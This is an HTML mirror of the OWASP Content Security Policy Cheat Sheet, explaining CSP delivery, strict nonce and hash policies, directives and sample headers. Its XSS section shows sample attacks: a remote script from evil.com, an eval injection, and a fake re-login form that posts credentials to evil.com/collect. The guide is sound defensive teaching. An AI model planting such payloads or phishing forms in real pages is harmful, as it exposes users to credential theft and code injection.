@@ -1,0 +1,290 @@
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Content Security Policy | Raw2Crawl</title><meta name="description" content="OWASP Cheat Sheet Series · Content Security Policy">
+<link rel="canonical" href="https://raw2crawl.github.io/en/OWASP/CheatSheetSeries/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"><link rel="icon" href="/assets/icon.svg" type="image/svg+xml">
+<meta name="color-scheme" content="light dark"><meta name="theme-color" content="#202020">
+<script>try{var t=localStorage.getItem('raw2crawl-theme');document.documentElement.dataset.theme=t==='light'||t==='dark'?t:matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light'}catch(e){document.documentElement.dataset.theme=matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light'}</script>
+<link rel="stylesheet" href="/assets/site.css"><script src="/assets/site.js" defer></script>
+</head><body id="top" class="documentation series-document">
+<a class="skip-link" href="#main-content">Skip to content</a>
+<header class="site-header"><a class="brand" href="/en/">Raw2Crawl<span class="brand-divider" aria-hidden="true">/</span><span class="brand-label">Documentation</span></a>
+<div class="header-actions"><span class="language" aria-label="Language: English">EN</span><button id="theme-toggle" type="button" aria-label="Switch color theme">Theme</button></div></header>
+<div class="series-layout"><main id="main-content" class="reading-pane series-reading"><nav class="breadcrumbs" aria-label="Breadcrumb"><a href="/en/">Library</a><span>/</span><a href="/en/OWASP/">OWASP</a><span>/</span><a href="/en/OWASP/CheatSheetSeries/">Cheat Sheet Series</a></nav><article class="doc-content"><h1 id="content-security-policy-cheat-sheet">Content Security Policy Cheat Sheet<a class="headerlink" href="#content-security-policy-cheat-sheet" title="Permanent link">&para;</a></h1>
+<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
+<p>This article brings forth a way to integrate the <strong>defense in depth</strong> concept to the client-side of web applications. By injecting the Content-Security-Policy (CSP) headers from the server, the browser is aware and capable of protecting the user from dynamic calls that will load content into the page currently being visited.</p>
+<h2 id="context">Context<a class="headerlink" href="#context" title="Permanent link">&para;</a></h2>
+<p>The increase in XSS (Cross-Site Scripting), clickjacking, and cross-site leak vulnerabilities demands a more <strong>defense in depth</strong> security approach.</p>
+<h3 id="defense-against-xss">Defense against XSS<a class="headerlink" href="#defense-against-xss" title="Permanent link">&para;</a></h3>
+<p>CSP defends against XSS attacks in the following ways:</p>
+<h4 id="1-restricting-inline-scripts">1. Restricting Inline Scripts<a class="headerlink" href="#1-restricting-inline-scripts" title="Permanent link">&para;</a></h4>
+<p>By preventing the page from executing inline scripts, attacks like injecting</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="o">=</span><span class="s1">'defaced'</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>will not work.</p>
+<h4 id="2-restricting-remote-scripts">2. Restricting Remote Scripts<a class="headerlink" href="#2-restricting-remote-scripts" title="Permanent link">&para;</a></h4>
+<p>By preventing the page from loading scripts from arbitrary servers, attacks like injecting</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">"https://evil.com/hacked.js"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>will not work.</p>
+<h4 id="3-restricting-unsafe-javascript">3. Restricting Unsafe JavaScript<a class="headerlink" href="#3-restricting-unsafe-javascript" title="Permanent link">&para;</a></h4>
+<p>By preventing the page from executing text-to-JavaScript functions like <code>eval</code>, the website will be safe from vulnerabilities like the this:</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// A Simple Calculator</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">op1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getUrlParameter</span><span class="p">(</span><span class="s2">"op1"</span><span class="p">);</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">op2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getUrlParameter</span><span class="p">(</span><span class="s2">"op2"</span><span class="p">);</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">sum</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">eval</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">op1</span><span class="si">}</span><span class="sb"> + </span><span class="si">${</span><span class="nx">op2</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`The sum is: </span><span class="si">${</span><span class="nx">sum</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</code></pre></div>
+<h4 id="4-restricting-form-submissions">4. Restricting Form submissions<a class="headerlink" href="#4-restricting-form-submissions" title="Permanent link">&para;</a></h4>
+<p>By restricting where HTML forms on your website can submit their data, injecting phishing forms won't work either.</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://evil.com/collect"</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span>Session expired! Please login again.<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>Username<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"username"</span><span class="p">/&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>Password<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"password"</span> <span class="na">name</span><span class="o">=</span><span class="s">"pass"</span><span class="p">/&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"Submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"Login"</span><span class="p">/&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="5-restricting-objects">5. Restricting Objects<a class="headerlink" href="#5-restricting-objects" title="Permanent link">&para;</a></h4>
+<p>And by restricting the HTML <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object">object</a> tag, it also won't be possible for an attacker to inject malicious flash/Java/other legacy executables on the page.</p>
+<h3 id="defense-against-framing-attacks">Defense against framing attacks<a class="headerlink" href="#defense-against-framing-attacks" title="Permanent link">&para;</a></h3>
+<p>Attacks like clickjacking and some variants of browser side-channel attacks (xs-leaks) require a malicious website to load the target website in a frame.</p>
+<p>Historically the <code>X-Frame-Options</code> header has been used for this, but it has been obsoleted by the <code>frame-ancestors</code> CSP directive.</p>
+<h3 id="defense-in-depth">Defense in Depth<a class="headerlink" href="#defense-in-depth" title="Permanent link">&para;</a></h3>
+<p>A strong CSP provides an effective <strong>second layer</strong> of protection against various types of vulnerabilities, especially XSS. Although CSP doesn't prevent web applications from <em>containing</em> vulnerabilities, it can make those vulnerabilities significantly more difficult for an attacker to exploit.</p>
+<p>Even on a fully static website, which does not accept any user input, a CSP can be used to enforce the use of <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">Subresource Integrity (SRI)</a>. This can help prevent malicious code from being loaded on the website if one of the third-party sites hosting JavaScript files (such as analytics scripts) is compromised.</p>
+<p>With all that being said, CSP <strong>should not</strong> be relied upon as the only defensive mechanism against XSS. You must still follow good development practices such as the ones described in <a href="Cross_Site_Scripting_Prevention_Cheat_Sheet.html">Cross-Site Scripting Prevention Cheat Sheet</a>, and then deploy CSP on top of that as a bonus security layer.</p>
+<h2 id="policy-delivery">Policy Delivery<a class="headerlink" href="#policy-delivery" title="Permanent link">&para;</a></h2>
+<p>You can deliver a Content Security Policy to your website in three ways.</p>
+<h3 id="1-content-security-policy-header">1. Content-Security-Policy Header<a class="headerlink" href="#1-content-security-policy-header" title="Permanent link">&para;</a></h3>
+<p>Send a Content-Security-Policy HTTP response header from your web server.</p>
+<div class="highlight"><pre><span></span><code>Content-Security-Policy: ...
+</code></pre></div>
+<p>Using a header is the preferred way and supports the full CSP feature set. Send it in all HTTP responses, not just the index page.</p>
+<p>This is a W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+</p>
+<h3 id="2-content-security-policy-report-only-header">2. Content-Security-Policy-Report-Only Header<a class="headerlink" href="#2-content-security-policy-report-only-header" title="Permanent link">&para;</a></h3>
+<p>Using the <code>Content-Security-Policy-Report-Only</code>, you can deliver a CSP that doesn't get enforced.</p>
+<div class="highlight"><pre><span></span><code>Content-Security-Policy-Report-Only: ...
+</code></pre></div>
+<p>Still, violation reports are printed to the console and delivered to a violation endpoint if the <code>report-to</code> and <code>report-uri</code> directives are used.</p>
+<p>This is also a W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+, whereby the policy is non-blocking ("fail open") and a report is sent to the URL designated by the <code>report-uri</code> (or newer <code>report-to</code>) directive. This is often used as a precursor to utilizing CSP in blocking mode ("fail closed")</p>
+<p>Browsers fully support the ability of a site to use both <code>Content-Security-Policy</code> and <code>Content-Security-Policy-Report-Only</code> together, without any issues. This pattern can be used for example to run a strict <code>Report-Only</code> policy (to get many violation reports), while having a looser enforced policy (to avoid breaking legitimate site functionality).</p>
+<h3 id="3-content-security-policy-meta-tag">3. Content-Security-Policy Meta Tag<a class="headerlink" href="#3-content-security-policy-meta-tag" title="Permanent link">&para;</a></h3>
+<p>Sometimes you cannot use the Content-Security-Policy header if you are, e.g., Deploying your HTML files in a CDN where the headers are out of your control.</p>
+<p>In this case, you can still use CSP by specifying a <code>http-equiv</code> meta tag in the HTML markup, like so:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">"Content-Security-Policy"</span> <span class="na">content</span><span class="o">=</span><span class="s">"..."</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Almost everything is still supported, including full XSS defenses. However, you will not be able to use <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors">framing protections</a>, <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox">sandboxing</a>, or a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to">CSP violation logging endpoint</a>.</p>
+<h3 id="warning">WARNING<a class="headerlink" href="#warning" title="Permanent link">&para;</a></h3>
+<p><strong>DO NOT</strong> use <code>X-Content-Security-Policy</code> or <code>X-WebKit-CSP</code>. Their implementations are obsolete (since Firefox 23, Chrome 25), limited, inconsistent, and incredibly buggy.</p>
+<h2 id="csp-types-granularallowlist-based-or-strict">CSP Types (granular/allowlist based or strict)<a class="headerlink" href="#csp-types-granularallowlist-based-or-strict" title="Permanent link">&para;</a></h2>
+<p>For original research on allowlist weaknesses, see <a href="https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/">CSP Is Dead, Long Live CSP!</a>.</p>
+<p>The original mechanism for building a CSP involved creating allow-lists which would define the content and sources that were permitted in the context of the HTML page.</p>
+<p>However, current leading practice is to create a "Strict" CSP which is much easier to deploy and more secure as it is less likely to be bypassed.</p>
+<h2 id="strict-csp">Strict CSP<a class="headerlink" href="#strict-csp" title="Permanent link">&para;</a></h2>
+<p>A strict CSP can be created by using a limited number of the granular <a href="#fetch-directives">Fetch Directives listed below</a> along with one of two mechanisms:</p>
+<ul>
+<li>Nonce based</li>
+<li>Hash based</li>
+</ul>
+<p>The <code>strict-dynamic</code> directive can optionally also be used to make it easier to implement a Strict CSP.</p>
+<p>The following sections will provide some basic guidance to these mechanisms but it is strongly recommended to follow Google's detailed and methodological instructions for creating a Strict CSP:</p>
+<p><strong><a href="https://web.dev/strict-csp/">Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP)</a></strong></p>
+<h3 id="nonce-based">Nonce based<a class="headerlink" href="#nonce-based" title="Permanent link">&para;</a></h3>
+<p>Nonces are unique one-time-use random values that you generate for each HTTP response, and add to the Content-Security-Policy header, like so:</p>
+<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">nonce</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uuid</span><span class="p">.</span><span class="nx">v4</span><span class="p">();</span>
+<span class="nx">scriptSrc</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="sb">` 'nonce-</span><span class="si">${</span><span class="nx">nonce</span><span class="si">}</span><span class="sb">'`</span><span class="p">;</span>
+</code></pre></div>
+<p>You would then pass this nonce to your view (using nonces requires a non-static HTML) and render script tags that look something like this:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span> <span class="na">nonce</span><span class="o">=</span><span class="s">"&lt;%= nonce %&gt;"</span><span class="p">&gt;</span>
+<span class="w">    </span><span class="p">...</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="warning_1">Warning<a class="headerlink" href="#warning_1" title="Permanent link">&para;</a></h4>
+<p><strong>Don't</strong> create a middleware that replaces all script tags with "script nonce=..." because attacker-injected scripts will then get the nonces as well. You need an actual HTML templating engine to use nonces.</p>
+<h3 id="hashes">Hashes<a class="headerlink" href="#hashes" title="Permanent link">&para;</a></h3>
+<p>When inline scripts are required, the <code>script-src 'hash_algo-hash'</code> is another option for allowing only specific scripts to execute.</p>
+<div class="highlight"><pre><span></span><code>Content-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='
+</code></pre></div>
+<p>To get the hash, look at Google Chrome developer tools for violations like this:</p>
+<blockquote>
+<p>❌ Refused to execute inline script because it violates the following Content Security Policy directive: "..." Either the 'unsafe-inline' keyword, a hash (<strong>'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='</strong>), or a nonce...</p>
+</blockquote>
+<p>You can also use this <a href="https://report-uri.com/home/hash">hash generator</a>. This is a great <a href="https://csp.withgoogle.com/docs/faq.html#static-content">example</a> of using hashes.</p>
+<h4 id="note">Note<a class="headerlink" href="#note" title="Permanent link">&para;</a></h4>
+<p>Using hashes can be a risky approach. If you change <em>anything</em> inside the script tag (even whitespace) by, e.g., formatting your code, the hash will be different, and the script won't render.</p>
+<h3 id="strict-dynamic">strict-dynamic<a class="headerlink" href="#strict-dynamic" title="Permanent link">&para;</a></h3>
+<p>The <code>strict-dynamic</code> directive can be used as part of a Strict CSP in combination with either hashes or nonces.</p>
+<p>If a script block which has either the correct hash or nonce is creating additional DOM elements and executing JS inside of them, <code>strict-dynamic</code> tells the browser to trust those elements as well without having to explicitly add nonces or hashes for each one.</p>
+<p>Note that while <code>strict-dynamic</code> is a CSP level 3 feature, CSP level 3 is very widely supported in common, modern browsers.</p>
+<p>For more details, check out <a href="https://w3c.github.io/webappsec-csp/#strict-dynamic-usage">strict-dynamic usage</a>.</p>
+<h2 id="detailed-csp-directives">Detailed CSP Directives<a class="headerlink" href="#detailed-csp-directives" title="Permanent link">&para;</a></h2>
+<p>Multiple types of directives exist that allow the developer to control the flow of the policies granularly. Note that creating a non-Strict policy that is too granular or permissive is likely to lead to bypasses and a loss of protection.</p>
+<h3 id="fetch-directives">Fetch Directives<a class="headerlink" href="#fetch-directives" title="Permanent link">&para;</a></h3>
+<p>Fetch directives tell the browser the locations to trust and load resources from.</p>
+<p>Most fetch directives have a certain <a href="https://www.w3.org/TR/CSP3/#directive-fallback-list">fallback list specified in w3</a>. This list allows for granular control of the source of scripts, images, files, etc.</p>
+<ul>
+<li><code>child-src</code> allows the developer to control nested browsing contexts and worker execution contexts.</li>
+<li><code>connect-src</code> provides control over fetch requests, XHR, eventsource, beacon and websockets connections.</li>
+<li><code>font-src</code> specifies which URLs to load fonts from.</li>
+<li><code>img-src</code> specifies the URLs that images can be loaded from.</li>
+<li><code>manifest-src</code> specifies the URLs that application manifests may be loaded from.</li>
+<li><code>media-src</code> specifies the URLs from which video, audio and text track resources can be loaded from.</li>
+<li><code>prefetch-src</code> was an experimental directive for prefetch/prerender resource URLs. It was <strong>removed from the CSP Level 3 specification</strong> and is ignored by modern browsers — do not rely on it for defense. Constrain scripts, styles, and default fetches with the standard fetch directives instead.</li>
+<li><code>object-src</code> specifies the URLs from which plugins can be loaded from.</li>
+<li><code>script-src</code> specifies the locations from which a script can be executed from. It is a fallback directive for other script-like directives.<ul>
+<li><code>script-src-elem</code> controls the location from which execution of script requests and blocks can occur.</li>
+<li><code>script-src-attr</code> controls the execution of event handlers.</li>
+</ul>
+</li>
+<li><code>style-src</code> controls from where styles get applied to a document. This includes <code>&lt;link&gt;</code> elements, <code>@import</code> rules, and requests originating from a <code>Link</code> HTTP response header field.<ul>
+<li><code>style-src-elem</code> controls styles except for inline attributes.</li>
+<li><code>style-src-attr</code> controls styles attributes.</li>
+</ul>
+</li>
+<li><code>default-src</code> is a fallback directive for the other fetch directives. Directives that are specified have no inheritance, yet directives that are not specified will fall back to the value of <code>default-src</code>.</li>
+</ul>
+<h3 id="document-directives">Document Directives<a class="headerlink" href="#document-directives" title="Permanent link">&para;</a></h3>
+<p>Document directives instruct the browser about the properties of the document to which the policies will apply to.</p>
+<ul>
+<li><code>base-uri</code> specifies the possible URLs that the <code>&lt;base&gt;</code> element can use.</li>
+<li><code>plugin-types</code> has been <a href="https://bugs.webkit.org/show_bug.cgi?id=220724">removed from the CSP specification</a>. Do not rely on it to enforce content types. Use <code>object-src 'none'</code> when embedded objects are unnecessary, as in the <a href="#strict-policy">strict policy examples</a>.</li>
+<li><code>sandbox</code> restricts a page's actions such as submitting forms.<ul>
+<li>Only applies when used with the request header <code>Content-Security-Policy</code>.</li>
+<li>Not specifying a value for the directive activates all of the sandbox restrictions. <code>Content-Security-Policy: sandbox;</code></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax">Sandbox syntax</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="navigation-directives">Navigation Directives<a class="headerlink" href="#navigation-directives" title="Permanent link">&para;</a></h3>
+<p>Navigation directives instruct the browser about the locations that the document can navigate to or be embedded from.</p>
+<ul>
+<li><code>form-action</code> restricts the URLs which the forms can submit to.</li>
+<li><code>frame-ancestors</code> restricts the URLs that can embed the requested resource inside of  <code>&lt;frame&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>, or <code>&lt;applet&gt;</code> elements.<ul>
+<li>If this directive is specified in a <code>&lt;meta&gt;</code> tag, the directive is ignored.</li>
+<li>This directive doesn't fallback to the <code>default-src</code> directive.</li>
+<li><code>X-Frame-Options</code> is rendered obsolete by this directive and is ignored by the user agents.</li>
+</ul>
+</li>
+</ul>
+<h3 id="reporting-directives">Reporting Directives<a class="headerlink" href="#reporting-directives" title="Permanent link">&para;</a></h3>
+<p>Reporting directives deliver violations of prevented behaviors to specified locations. These directives serve no purpose on their own and are dependent on other directives.</p>
+<ul>
+<li><code>report-to</code> (CSP Level 3, used together with the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Reporting_API">Reporting API</a>) is the <strong>primary, current</strong> reporting directive. It references an endpoint name defined in the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Reporting-Endpoints#syntax">Reporting-Endpoints response header</a>, which uses comma-separated <code>name="URL"</code> entries. The legacy <code>Report-To</code> header uses JSON instead.<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to">MDN report-to documentation</a></li>
+</ul>
+</li>
+<li><code>report-uri</code> is <strong>deprecated</strong> by CSP Level 3 in favor of <code>report-to</code>. It takes a URI that reports are sent to.<ul>
+<li>Format: <code>Content-Security-Policy: report-uri https://example.com/csp-reports</code></li>
+</ul>
+</li>
+</ul>
+<p>For backward compatibility, declare both directives in conjunction. Browsers that support <code>report-to</code> will use it and ignore <code>report-uri</code>; older browsers fall back to <code>report-uri</code>. Once support for legacy browsers is no longer required, <code>report-uri</code> can be removed.</p>
+<h3 id="special-directive-sources">Special Directive Sources<a class="headerlink" href="#special-directive-sources" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>'none'</td>
+<td>No URLs match.</td>
+</tr>
+<tr>
+<td>'self'</td>
+<td>Refers to the origin site with the same scheme and port number.</td>
+</tr>
+<tr>
+<td>'unsafe-inline'</td>
+<td>Allows the usage of inline scripts or styles.</td>
+</tr>
+<tr>
+<td>'unsafe-eval'</td>
+<td>Allows the usage of eval in scripts.</td>
+</tr>
+</tbody>
+</table>
+<p>To better understand how the directive sources work, check out the <a href="https://w3c.github.io/webappsec-csp/#framework-directive-source-list">source lists from w3c</a>.</p>
+<h2 id="csp-sample-policies">CSP Sample Policies<a class="headerlink" href="#csp-sample-policies" title="Permanent link">&para;</a></h2>
+<h3 id="strict-policy">Strict Policy<a class="headerlink" href="#strict-policy" title="Permanent link">&para;</a></h3>
+<p>A strict policy's role is to protect against classical stored, reflected, and some of the DOM XSS attacks and should be the optimal goal of any team trying to implement CSP.</p>
+<p>As noted above, Google went ahead and set up a detailed and methodological <a href="https://web.dev/strict-csp">instructions</a> for creating a Strict CSP.</p>
+<p>Based on those instructions, one of the following two policies can be used to apply a strict policy:</p>
+<h4 id="nonce-based-strict-policy">Nonce-based Strict Policy<a class="headerlink" href="#nonce-based-strict-policy" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>Content-Security-Policy:
+  script-src 'nonce-{RANDOM}' 'strict-dynamic';
+  object-src 'none';
+  base-uri 'none';
+</code></pre></div>
+<h4 id="hash-based-strict-policy">Hash-based Strict Policy<a class="headerlink" href="#hash-based-strict-policy" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>Content-Security-Policy:
+  script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';
+  object-src 'none';
+  base-uri 'none';
+</code></pre></div>
+<h3 id="basic-non-strict-csp-policy">Basic non-Strict CSP Policy<a class="headerlink" href="#basic-non-strict-csp-policy" title="Permanent link">&para;</a></h3>
+<p>This policy can be used if it is not possible to create a Strict Policy and it prevents cross-site framing and cross-site form-submissions. It will only allow resources from the originating domain for all the default level directives and will not allow inline scripts/styles to execute.</p>
+<p>If your application functions with these restrictions, it drastically reduces your attack surface and works with most modern browsers.</p>
+<p>The most basic policy assumes:</p>
+<ul>
+<li>All resources are hosted by the same domain of the document.</li>
+<li>There are no inlines or evals for scripts and style resources.</li>
+<li>There is no need for other websites to frame the website.</li>
+<li>There are no form-submissions to external websites.</li>
+</ul>
+<div class="highlight"><pre><span></span><code>Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';
+</code></pre></div>
+<p>To tighten further, one can apply the following:</p>
+<div class="highlight"><pre><span></span><code>Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
+</code></pre></div>
+<p>This policy allows images, scripts, AJAX, and CSS from the same origin and does not allow any other resources to load (e.g., object, frame, media, etc.).</p>
+<h3 id="upgrading-insecure-requests">Upgrading insecure requests<a class="headerlink" href="#upgrading-insecure-requests" title="Permanent link">&para;</a></h3>
+<p>If the developer is migrating from HTTP to HTTPS, the following directive will ensure that all requests will be sent over HTTPS with no fallback to HTTP:</p>
+<div class="highlight"><pre><span></span><code>Content-Security-Policy: upgrade-insecure-requests;
+</code></pre></div>
+<h3 id="preventing-framing-attacks-clickjacking-cross-site-leaks">Preventing framing attacks (clickjacking, cross-site leaks)<a class="headerlink" href="#preventing-framing-attacks-clickjacking-cross-site-leaks" title="Permanent link">&para;</a></h3>
+<ul>
+<li>To prevent all framing of your content use:<ul>
+<li><code>Content-Security-Policy: frame-ancestors 'none';</code></li>
+</ul>
+</li>
+<li>To allow for the site itself, use:<ul>
+<li><code>Content-Security-Policy: frame-ancestors 'self';</code></li>
+</ul>
+</li>
+<li>To allow for trusted domain, do the following:<ul>
+<li><code>Content-Security-Policy: frame-ancestors trusted.com;</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="refactoring-inline-code">Refactoring inline code<a class="headerlink" href="#refactoring-inline-code" title="Permanent link">&para;</a></h3>
+<p>When <code>default-src</code> or <code>script-src*</code> directives are active, CSP by default disables any JavaScript code placed inline in the HTML source, such as this:</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"314"</span>
+<span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</code></pre></div>
+<p>The inline code can be moved to a separate JavaScript file and the code in the page becomes:</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="s2">"app.js"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></div>
+<p>With <code>app.js</code> containing the <code>var foo = "314"</code> code.</p>
+<p>The inline code restriction also applies to <code>inline event handlers</code>, so that the following construct will be blocked under CSP:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">button</span> <span class="na">id</span><span class="o">=</span><span class="s">"button1"</span> <span class="na">onclick</span><span class="o">=</span><span class="s">"doSomething()"</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>This should be replaced by <code>addEventListener</code> calls:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"button1"</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">'click'</span><span class="p">,</span><span class="w"> </span><span class="nx">doSomething</span><span class="p">);</span>
+</code></pre></div>
+<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://www.w3.org/TR/CSP3/">W3C Content Security Policy Level 3</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy">MDN Content-Security-Policy header</a></li>
+<li><a href="https://web.dev/articles/strict-csp">Strict CSP deployment guidance</a></li>
+</ul></article></main><aside class="page-outline" aria-label="On this page"><p class="eyebrow">On this page</p><nav id="page-toc"></nav></aside></div>
+<footer class="site-footer"><span>Raw2Crawl · Security documentation</span><span>Cheat Sheet Series © OWASP Foundation &amp; contributors · <a href="https://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA 4.0</a> · <a href="https://github.com/OWASP/CheatSheetSeries">Source</a></span></footer>
+</body></html>
